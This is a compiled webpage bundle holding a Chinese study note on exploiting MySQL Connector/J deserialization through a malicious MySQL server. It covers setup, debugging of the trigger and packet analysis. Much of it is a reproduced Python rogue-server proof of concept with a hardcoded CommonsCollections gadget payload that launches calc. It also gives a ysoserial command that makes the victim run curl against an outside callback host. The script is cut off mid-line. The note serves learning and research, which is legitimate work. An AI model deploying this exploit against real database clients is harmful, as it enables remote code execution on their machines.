(window.webpackJsonp=window.webpackJsonp||[]).push([[15],{334:function(a,t,n){"use strict";n.r(t);var s=n(10),e=Object(s.a)({},(function(){var a=this,t=a._self._c;return t("ContentSlotsDistributor",{attrs:{"slot-key":a.$parent.slotKey}},[t("blockquote",[t("p",[a._v("学习来源 "),t("a",{attrs:{href:"https://xz.aliyun.com/t/8159#toc-2",target:"_blank",rel:"noopener noreferrer"}},[a._v("https://xz.aliyun.com/t/8159"),t("OutboundLink")],1)])]),a._v(" "),t("h2",{attrs:{id:"jdbc？"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#jdbc？"}},[a._v("#")]),a._v(" JDBC？")]),a._v(" "),t("div",{staticClass:"language-yaml line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-yaml"}},[t("code",[a._v("Java Database Connectivity\n")])]),a._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[a._v("1")]),t("br")])]),t("p",[a._v("不复制粘贴了,见"),t("a",{attrs:{href:"https://www.yiibai.com/jdbc/jdbc-introduction.html",target:"_blank",rel:"noopener noreferrer"}},[a._v("JDBC基础介绍"),t("OutboundLink")],1)]),a._v(" "),t("h2",{attrs:{id:"测试环境"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#测试环境"}},[a._v("#")]),a._v(" 测试环境")]),a._v(" "),t("ul",[t("li",[a._v("IDEA")]),a._v(" "),t("li",[a._v("Mysql 5.7")])]),a._v(" "),t("h2",{attrs:{id:"建立jdbc连接"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#建立jdbc连接"}},[a._v("#")]),a._v(" 建立JDBC连接")]),a._v(" "),t("p",[t("a",{attrs:{href:"https://www.runoob.com/java/java-mysql-connect.html",target:"_blank",rel:"noopener noreferrer"}},[a._v("https://www.runoob.com/java/java-mysql-connect.html"),t("OutboundLink")],1),a._v(" "),t("img",{attrs:{src:"https://cdn.nlark.com/yuque/0/2021/png/370919/1616213850445-e94d6188-7f4b-421e-bbe3-f06565c26671.png#align=left&display=inline&height=384&margin=%5Bobject%20Object%5D&name=image.png&originHeight=768&originWidth=1704&size=160936&status=done&style=none&width=852",alt:"image.png"}}),a._v("\n下载驱动包\n"),t("a",{attrs:{href:"https://dev.mysql.com/downloads/connector/j/",target:"_blank",rel:"noopener noreferrer"}},[a._v("https://dev.mysql.com/downloads/connector/j/"),t("OutboundLink")],1),a._v("\n不要下最新的，估摸着是修了。下载8.0.12\n"),t("img",{attrs:{src:"https://cdn.nlark.com/yuque/0/2021/png/370919/1616216597580-7f88f752-b65e-43b4-a4e6-ccb95787806a.png#align=left&display=inline&height=567&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1134&originWidth=2176&size=200748&status=done&style=none&width=1088",alt:"image.png"}}),a._v("\n多下几个版本\n"),t("img",{attrs:{src:"https://cdn.nlark.com/yuque/0/2021/png/370919/1616216689611-2ce24de1-6a58-4e50-9c42-5eb369d91987.png#align=left&display=inline&height=690&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1380&originWidth=3414&size=303431&status=done&style=none&width=1707",alt:"image.png"}})]),a._v(" "),t("blockquote",[t("p",[a._v("每个版本在反序列化利用的时候有一定区别。")])]),a._v(" "),t("p",[a._v("右键引入作为module库，就跑起来了。\n"),t("img",{attrs:{src:"https://cdn.nlark.com/yuque/0/2021/png/370919/1616216924404-0b574c6c-d799-4ab9-b2d0-fb164869e083.png#align=left&display=inline&height=899&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1798&originWidth=3410&size=480929&status=done&style=none&width=1705",alt:"image.png"}})]),a._v(" "),t("h2",{attrs:{id:"反序列化简单介绍"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#反序列化简单介绍"}},[a._v("#")]),a._v(" 反序列化简单介绍")]),a._v(" "),t("p",[t("a",{attrs:{href:"https://blog.csdn.net/sun1318578251/article/details/106120247?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161621996416780264022275%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&request_id=161621996416780264022275&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_v1~rank_blog_v1-3-106120247.pc_v1_rank_blog_v1&utm_term=%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96",target:"_blank",rel:"noopener noreferrer"}},[a._v("漫谈Java反序列化"),t("OutboundLink")],1),a._v(" "),t("a",{attrs:{href:"https://github.com/SummerSec/JavaLearnVulnerability",target:"_blank",rel:"noopener noreferrer"}},[a._v("https://github.com/SummerSec/JavaLearnVulnerability"),t("OutboundLink")],1)]),a._v(" "),t("p",[a._v("以及落木萧萧的article\n"),t("img",{attrs:{src:"https://cdn.nlark.com/yuque/0/2021/png/370919/1616223147561-4c331b1a-30b1-40c5-8e10-672611f7ff35.png#align=left&display=inline&height=165&margin=%5Bobject%20Object%5D&name=image.png&originHeight=330&originWidth=836&size=74208&status=done&style=none&width=418",alt:"image.png"}}),a._v("\n跟着文章学习")]),a._v(" "),t("div",{staticClass:"language-yaml line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-yaml"}},[t("code",[a._v("反序列化漏洞三要素实现Serializabe接口、readObject()、writeObject()方法，缺一不可。\n\n漏洞挖掘或许就是怎么找到可控点，达到rce的目的。\n")])]),a._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[a._v("1")]),t("br"),t("span",{staticClass:"line-number"},[a._v("2")]),t("br"),t("span",{staticClass:"line-number"},[a._v("3")]),t("br")])]),t("h2",{attrs:{id:"断点调试"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#断点调试"}},[a._v("#")]),a._v(" 断点调试")]),a._v(" "),t("p",[a._v("com.mysql.cj.jdbc.Driver的触发点是")]),a._v(" "),t("div",{staticClass:"language-yaml line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-yaml"}},[t("code",[a._v("com.mysql.cj.jdbc.result.ResultSetImpl.getObject()\n")])]),a._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[a._v("1")]),t("br")])]),t("p",[a._v("要触发需要在连接字符串中加上")]),a._v(" "),t("div",{staticClass:"language-yaml line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-yaml"}},[t("code",[a._v("queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor"),t("span",{pre:!0,attrs:{class:"token important"}},[a._v("&autoDeserialize=true")]),a._v("\n")])]),a._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[a._v("1")]),t("br")])]),t("p",[a._v("打断点\n"),t("img",{attrs:{src:"https://cdn.nlark.com/yuque/0/2021/png/370919/1616227052560-ca3ff2fe-2cca-4132-84ea-5d962448450d.png#align=left&display=inline&height=869&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1738&originWidth=3108&size=544275&status=done&style=none&width=1554",alt:"image.png"}})]),a._v(" "),t("p",[t("img",{attrs:{src:"https://cdn.nlark.com/yuque/0/2021/png/370919/1616227859063-764ac983-dc15-44a2-aecb-be0181f43b5e.png#align=left&display=inline&height=722&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1444&originWidth=2522&size=318201&status=done&style=none&width=1261",alt:"image.png"}})]),a._v(" "),t("p",[a._v("如果是二进制数据就会往下走，到readObject处触发反序列化。")]),a._v(" "),t("p",[a._v("这个方法在"),t("code",[a._v("com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor.populateMapWithSessionStatusValues()")]),a._v(" 处调用。")]),a._v(" "),t("p",[t("img",{attrs:{src:"https://cdn.nlark.com/yuque/0/2021/png/370919/1616228701636-11acfc50-a25d-4f97-b88f-4cdcd45050a1.png#align=left&display=inline&height=122&margin=%5Bobject%20Object%5D&name=image.png&originHeight=244&originWidth=1760&size=64897&status=done&style=none&width=880",alt:"image.png"}}),a._v("\n对比其他人的漏洞分析文章发现，我的这个版本在这里没有了对结果处理的函数\n"),t("img",{attrs:{src:"https://cdn.nlark.com/yuque/0/2021/png/370919/1616228817032-2cc2953e-2661-42c1-9c4e-4452dd05d840.png#align=left&display=inline&height=496&margin=%5Bobject%20Object%5D&name=image.png&originHeight=992&originWidth=3222&size=259148&status=done&style=none&width=1611",alt:"image.png"}})]),a._v(" "),t("p",[t("img",{attrs:{src:"https://cdn.nlark.com/yuque/0/2021/png/370919/1616229048302-6c16385b-177c-4d5f-9826-0094515374ab.png#align=left&display=inline&height=704&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1408&originWidth=3056&size=362252&status=done&style=none&width=1528",alt:"image.png"}})]),a._v(" "),t("p",[a._v("调用点\n"),t("img",{attrs:{src:"https://cdn.nlark.com/yuque/0/2021/png/370919/1616229117005-f9450aad-c4da-4a4d-afcb-f82a9b1d4439.png#align=left&display=inline&height=206&margin=%5Bobject%20Object%5D&name=image.png&originHeight=412&originWidth=2016&size=62016&status=done&style=none&width=1008",alt:"image.png"}})]),a._v(" "),t("h2",{attrs:{id:"构造poc"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#构造poc"}},[a._v("#")]),a._v(" 构造POC")]),a._v(" "),t("p",[a._v("根据执行"),t("code",[a._v("SHOW SESSION STATUS")]),a._v("这条语句之后要在服务端返回一个恶意的二进制对象，所以重点就是怎么构造这个对象，有时候漏洞存在的情况仍然攻击不成功，有可能是因为各个版本的mysql发包不一样，需要抓包定制化攻击。")]),a._v(" "),t("p",[a._v("Mac下抓包测试")]),a._v(" "),t("div",{staticClass:"language-yaml line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-yaml"}},[t("code",[a._v("tcp.port ==3306 "),t("span",{pre:!0,attrs:{class:"token important"}},[a._v("&&")]),a._v(" mysql\n")])]),a._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[a._v("1")]),t("br")])]),t("p",[t("img",{attrs:{src:"https://cdn.nlark.com/yuque/0/2021/png/370919/1616231590988-dba4c90b-7533-47a9-b600-103db981b64b.png#align=left&display=inline&height=743&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1486&originWidth=2462&size=346908&status=done&style=none&width=1231",alt:"image.png"}}),a._v("\n第一个是Response Ok\n"),t("img",{attrs:{src:"https://cdn.nlark.com/yuque/0/2021/png/370919/1616232398594-50de1707-4575-4c56-92d8-6e5626a96852.png#align=left&display=inline&height=969&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1938&originWidth=2462&size=449027&status=done&style=none&width=1231",alt:"image.png"}})]),a._v(" "),t("p",[a._v("数据包内容为")]),a._v(" "),t("div",{staticClass:"language-yaml line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-yaml"}},[t("code",[a._v("0700000200000002000000\n")])]),a._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[a._v("1")]),t("br")])]),t("h3",{attrs:{id:"show-session-status响应包"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#show-session-status响应包"}},[a._v("#")]),a._v(" show session status响应包")]),a._v(" "),t("p",[a._v("重点是这个响应包")]),a._v(" "),t("p",[t("img",{attrs:{src:"https://cdn.nlark.com/yuque/0/2021/png/370919/1616232578511-383488b6-368b-4671-bdc6-c7814753a674.png#align=left&display=inline&height=113&margin=%5Bobject%20Object%5D&name=image.png&originHeight=226&originWidth=1794&size=81537&status=done&style=none&width=897",alt:"image.png"}}),a._v("\n结果集响应包的结构")]),a._v(" "),t("ul",[t("li",[a._v("数据段1：说明下面的结果集有多少列")]),a._v(" "),t("li",[a._v("数据段2：列的定义")]),a._v(" "),t("li",[a._v("数据段3： EOF 包")]),a._v(" "),t("li",[a._v("数据段4：行数据。")])]),a._v(" "),t("p",[t("img",{attrs:{src:"https://cdn.nlark.com/yuque/0/2021/png/370919/1616233352484-fd175288-fd77-4a1d-9886-932437005007.png#align=left&display=inline&height=232&margin=%5Bobject%20Object%5D&name=image.png&originHeight=464&originWidth=645&size=37255&status=done&style=none&width=322.5",alt:"image.png"}}),a._v("\n结果集数据包如图")]),a._v(" "),t("p",[t("img",{attrs:{src:"https://cdn.nlark.com/yuque/0/2021/png/370919/1616233047383-f6de0076-578a-4e0a-941b-e80cb9b5aafd.png#align=left&display=inline&height=969&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1938&originWidth=2462&size=582709&status=done&style=none&width=1231",alt:"image.png"}})]),a._v(" "),t("div",{staticClass:"language-yaml line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-yaml"}},[t("code",[a._v(" 01 数据长度为1 00  00 01 sequence id为1 02 代表有两列\n")])]),a._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[a._v("1")]),t("br")])]),t("p",[a._v("整个数据包如下\n"),t("img",{attrs:{src:"https://cdn.nlark.com/yuque/0/2021/png/370919/1616233155416-70bb2180-ffc8-4228-83a4-33f2fab0b093.png#align=left&display=inline&height=969&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1938&originWidth=2462&size=587398&status=done&style=none&width=1231",alt:"image.png"}})]),a._v(" "),t("p",[a._v("第三部分是EOF，文章作者说加上就会报错。我在问熟悉这个漏洞的朋友。\n第四部分就是自己的poc\n使用yso生成即可。\nyso的链目前不懂。")]),a._v(" "),t("div",{staticClass:"language-yaml line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-yaml"}},[t("code",[a._v(" java "),t("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v("-")]),a._v('jar wingyso.jar CommonsCollections7 "curl 5s3g.hyuga.co" '),t("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v(">")]),a._v(" data\n")])]),a._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[a._v("1")]),t("br")])]),t("p",[a._v("补充截图\n问候报文\n"),t("img",{attrs:{src:"https://cdn.nlark.com/yuque/0/2021/png/370919/1616233804919-e57c4327-e3f3-45fd-a0b1-205b9fcec180.png#align=left&display=inline&height=969&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1938&originWidth=2462&size=478927&status=done&style=none&width=1231",alt:"image.png"}}),a._v("\n所有的response需要对应上。\n作者的poc")]),a._v(" "),t("div",{staticClass:"language-yaml line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-yaml"}},[t("code",[t("span",{pre:!0,attrs:{class:"token comment"}},[a._v("# -*- coding:utf-8 -*-")]),a._v("\n"),t("span",{pre:!0,attrs:{class:"token comment"}},[a._v("#@Time : 2020/7/27 2:10")]),a._v("\n"),t("span",{pre:!0,attrs:{class:"token comment"}},[a._v("#@Author: Tri0mphe7")]),a._v("\n"),t("span",{pre:!0,attrs:{class:"token comment"}},[a._v("#@File : server.py")]),a._v('\nimport socket\nimport binascii\nimport os\n\ngreeting_data="4a0000000a352e372e31390008000000463b452623342c2d00fff7080200ff811500000000000000000000032851553e5c23502c51366a006d7973716c5f6e61746976655f70617373776f726400"\nresponse_ok_data="0700000200000002000000"\n\n'),t("span",{pre:!0,attrs:{class:"token key atrule"}},[a._v("def receive_data(conn)")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v(":")]),a._v('\n    data = conn.recv(1024)\n    print("'),t("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v("[")]),a._v("*"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v("]")]),a._v(" Receiveing the package "),t("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v(":")]),a._v(" "),t("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v("{")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v("}")]),a._v('".format(data))\n    return str(data).lower()\n\ndef send_data(conn'),t("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v(",")]),t("span",{pre:!0,attrs:{class:"token key atrule"}},[a._v("data)")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v(":")]),a._v('\n    print("'),t("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v("[")]),a._v("*"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v("]")]),a._v(" Sending the package "),t("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v(":")]),a._v(" "),t("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v("{")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v("}")]),a._v('".format(data))\n    conn.send(binascii.a2b_hex(data))\n\n'),t("span",{pre:!0,attrs:{class:"token key atrule"}},[a._v("def get_payload_content()")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v(":")]),a._v("\n    //file文件的内容使用ysoserial生成的 使用规则  java "),t("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v("-")]),a._v("jar ysoserial "),t("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v("[")]),a._v("common7那个"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v("]")]),a._v('  "calc" '),t("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v(">")]),a._v(" a \n    file= r'a'\n    "),t("span",{pre:!0,attrs:{class:"token key atrule"}},[a._v("if os.path.isfile(file)")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v(":")]),a._v("\n        with open(file"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v(",")]),a._v(" 'rb') as f"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v(":")]),a._v("\n            payload_content = str(binascii.b2a_hex(f.read())"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v(",")]),a._v("encoding='utf"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v("-")]),a._v('8\')\n        print("open successs")\n\n    '),t("span",{pre:!0,attrs:{class:"token key atrule"}},[a._v("else")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v(":")]),a._v('\n        print("open false")\n        '),t("span",{pre:!0,attrs:{class:"token comment"}},[a._v("#calc")]),a._v("\n        payload_content='aced0005737200116a6176612e7574696c2e48617368536574ba44859596b8b7340300007870770c000000023f40000000000001737200346f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6b657976616c75652e546965644d6170456e7472798aadd29b39c11fdb0200024c00036b65797400124c6a6176612f6c616e672f4f626a6563743b4c00036d617074000f4c6a6176612f7574696c2f4d61703b7870740003666f6f7372002a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6d61702e4c617a794d61706ee594829e7910940300014c0007666163746f727974002c4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436861696e65645472616e73666f726d657230c797ec287a97040200015b000d695472616e73666f726d65727374002d5b4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707572002d5b4c6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e5472616e73666f726d65723bbd562af1d83418990200007870000000057372003b6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436f6e7374616e745472616e73666f726d6572587690114102b1940200014c000969436f6e7374616e7471007e00037870767200116a6176612e6c616e672e52756e74696d65000000000000000000000078707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e496e766f6b65725472616e73666f726d657287e8ff6b7b7cce380200035b000569417267737400135b4c6a6176612f6c616e672f4f626a6563743b4c000b694d6574686f644e616d657400124c6a6176612f6c616e672f537472696e673b5b000b69506172616d54797065737400125b4c6a6176612f6c616e672f436c6173733b7870757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000274000a67657452756e74696d65757200125b4c6a6176612e6c616e672e436c6173733bab16d7aecbcd5a990200007870000000007400096765744d6574686f647571007e001b00000002767200106a6176612e6c616e672e537472696e67a0f0a4387a3bb34202000078707671007e001b7371007e00137571007e001800000002707571007e001800000000740006696e766f6b657571007e001b00000002767200106a6176612e6c616e672e4f626a656374000000000000000000000078707671007e00187371007e0013757200135b4c6a6176612e6c616e672e537472696e673badd256e7e91d7b4702000078700000000174000463616c63740004657865637571007e001b0000000171007e00207371007e000f737200116a6176612e6c616e672e496e746567657212e2a0a4f781873802000149000576616c7565787200106a6176612e6c616e672e4e756d62657286ac951d0b94e08b020000787000000001737200116a6176612e7574696c2e486173684d61700507dac1c31660d103000246000a6c6f6164466163746f724900097468726573686f6c6478703f4000000000000077080000001000000000787878'\n    return payload_content\n\n"),t("span",{pre:!0,attrs:{class:"token comment"}},[a._v("# 主要逻辑")]),a._v("\n"),t("span",{pre:!0,attrs:{class:"token key atrule"}},[a._v("def run()")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v(":")]),a._v("\n\n    "),t("span",{pre:!0,attrs:{class:"token key atrule"}},[a._v("while 1")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v(":")]),a._v("\n        conn"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v(",")]),a._v(' addr = sk.accept()\n        print("Connection come from '),t("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v("{")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v("}")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v(":")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v("{")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v("}")]),a._v('".format(addr'),t("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v("[")]),t("span",{pre:!0,attrs:{class:"token number"}},[a._v("0")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v("]")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v(",")]),a._v("addr"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v("[")]),t("span",{pre:!0,attrs:{class:"token number"}},[a._v("1")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v("]")]),a._v("))\n\n        "),t("span",{pre:!0,attrs:{class:"token comment"}},[a._v("# 1.先发送第一个 问候报文")]),a._v("\n        send_data(conn"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v(",")]),a._v("greeting_data)\n\n        "),t("span",{pre:!0,attrs:{class:"token key atrule"}},[a._v("while True")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v(":")]),a._v("\n            "),t("span",{pre:!0,attrs:{class:"token comment"}},[a._v("# 登录认证过程模拟  1.客户端发送request login报文 2.服务端响应response_ok")]),a._v("\n            receive_data(conn)\n            send_data(conn"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v(",")]),a._v("response_ok_data)\n\n            "),t("span",{pre:!0,attrs:{class:"token comment"}},[a._v("#其他过程")]),a._v("\n            data=receive_data(conn)\n            "),t("span",{pre:!0,attrs:{class:"token comment"}},[a._v("#查询一些配置信息,其中会发送自己的 版本号")]),a._v("\n            "),t("span",{pre:!0,attrs:{class:"token key atrule"}},[a._v('if "session.auto_increment_increment" in data')]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v(":")]),a._v("\n                _payload='01000001132e00000203646566000000186175746f5f696e6372656d656e745f696e6372656d656e74000c3f001500000008a0000000002a00000303646566000000146368617261637465725f7365745f636c69656e74000c21000c000000fd00001f00002e00000403646566000000186368617261637465725f7365745f636f6e6e656374696f6e000c21000c000000fd00001f00002b00000503646566000000156368617261637465725f7365745f726573756c7473000c21000c000000fd00001f00002a00000603646566000000146368617261637465725f7365745f736572766572000c210012000000fd00001f0000260000070364656600000010636f6c6c6174696f6e5f736572766572000c210033000000fd00001f000022000008036465660000000c696e69745f636f6e6e656374000c210000000000fd00001f0000290000090364656600000013696e7465726163746976655f74696d656f7574000c3f001500000008a0000000001d00000a03646566000000076c6963656e7365000c210009000000fd00001f00002c00000b03646566000000166c6f7765725f636173655f7461626c655f6e616d6573000c3f001500000008a0000000002800000c03646566000000126d61785f616c6c6f7765645f7061636b6574000c3f001500000008a0000000002700000d03646566000000116e65745f77726974655f74696d656f7574000c3f001500000008a0000000002600000e036465660000001071756572795f63616368655f73697a65000c3f001500000008a0000000002600000f036465660000001071756572795f63616368655f74797065000c210009000000fd00001f00001e000010036465660000000873716c5f6d6f6465000c21009b010000fd00001f000026000011036465660000001073797374656d5f74696d655f7a6f6e65000c21001b000000fd00001f00001f000012036465660000000974696d655f7a6f6e65000c210012000000fd00001f00002b00001303646566000000157472616e73616374696f6e5f69736f6c6174696f6e000c21002d000000fd00001f000022000014036465660000000c776169745f74696d656f7574000c3f001500000008a000000000020100150131047574663804757466380475746638066c6174696e31116c6174696e315f737765646973685f6369000532383830300347504c013107343139343330340236300731303438353736034f4646894f4e4c595f46554c4c5f47524f55505f42592c5354524943545f5452414e535f5441424c45532c4e4f5f5a45524f5f494e5f444154452c4e4f5f5a45524f5f444154452c4552524f525f464f525f4449564953494f4e5f42595f5a45524f2c4e4f5f4155544f5f4352454154455f555345522c4e4f5f454e47494e455f535542535449545554494f4e0cd6d0b9fab1ead7bccab1bce4062b30383a30300f52455045415441424c452d5245414405323838303007000016fe000002000000'\n                send_data(conn"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v(",")]),a._v("_payload)\n                data=receive_data(conn)\n            "),t("span",{pre:!0,attrs:{class:"token key atrule"}},[a._v('elif "show warnings" in data')]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v(":")]),a._v("\n                _payload = '01000001031b00000203646566000000054c6576656c000c210015000000fd01001f00001a0000030364656600000004436f6465000c3f000400000003a1000000001d00000403646566000000074d657373616765000c210000060000fd01001f000059000005075761726e696e6704313238374b27404071756572795f63616368655f73697a6527206973206465707265636174656420616e642077696c6c2062652072656d6f76656420696e2061206675747572652072656c656173652e59000006075761726e696e6704313238374b27404071756572795f63616368655f7479706527206973206465707265636174656420616e642077696c6c2062652072656d6f76656420696e2061206675747572652072656c656173652e07000007fe000002000000'\n                send_data(conn"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v(",")]),a._v(" _payload)\n                data = receive_data(conn)\n            "),t("span",{pre:!0,attrs:{class:"token key atrule"}},[a._v('if "set names" in data')]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v(":")]),a._v("\n                send_data(conn"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v(",")]),a._v(" response_ok_data)\n                data = receive_data(conn)\n            "),t("span",{pre:!0,attrs:{class:"token key atrule"}},[a._v('if "set character_set_results" in data')]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v(":")]),a._v("\n                send_data(conn"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v(",")]),a._v(" response_ok_data)\n                data = receive_data(conn)\n            "),t("span",{pre:!0,attrs:{class:"token key atrule"}},[a._v('if "show session status" in data')]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v(":")]),a._v("\n                mysql_data = '0100000102'\n                mysql_data += '1a000002036465660001630163016301630c3f00ffff0000fc9000000000'\n                mysql_data += '1a000003036465660001630163016301630c3f00ffff0000fc9000000000'\n                "),t("span",{pre:!0,attrs:{class:"token comment"}},[a._v("# 为什么我加了EOF Packet 就无法正常运行呢？？")]),a._v("\n                //获取payload\n                payload_content=get_payload_content()\n                //计算payload长度\n                payload_length = str(hex(len(payload_content)//2)).replace('0x'"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v(",")]),a._v(" '').zfill(4)\n                payload_length_hex = payload_length"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v("[")]),a._v("2"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v(":")]),t("span",{pre:!0,attrs:{class:"token number"}},[a._v("4")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v("]")]),a._v(" + payload_length"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v("[")]),a._v("0"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v(":")]),t("span",{pre:!0,attrs:{class:"token number"}},[a._v("2")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v("]")]),a._v("\n                //计算数据包长度\n                data_len = str(hex(len(payload_content)//2 + 4)).replace('0x'"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v(",")]),a._v(" '').zfill(6)\n                data_len_hex = data_len"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v("[")]),a._v("4"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v(":")]),t("span",{pre:!0,attrs:{class:"token number"}},[a._v("6")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v("]")]),a._v(" + data_len"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v("[")]),a._v("2"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v(":")]),t("span",{pre:!0,attrs:{class:"token number"}},[a._v("4")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v("]")]),a._v(" + data_len"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v("[")]),a._v("0"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v(":")]),t("span",{pre:!0,attrs:{class:"token number"}},[a._v("2")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v("]")]),a._v("\n                mysql_data += data_len_hex + '04' + 'fbfc'+ payload_length_hex\n                mysql_data += str(payload_content)\n                mysql_data += '07000005fe000022000100'\n                send_data(conn"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v(",")]),a._v(" mysql_data)\n                data = receive_data(conn)\n            "),t("span",{pre:!0,attrs:{class:"token key atrule"}},[a._v('if "show warnings" in data')]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v(":")]),a._v("\n                payload = 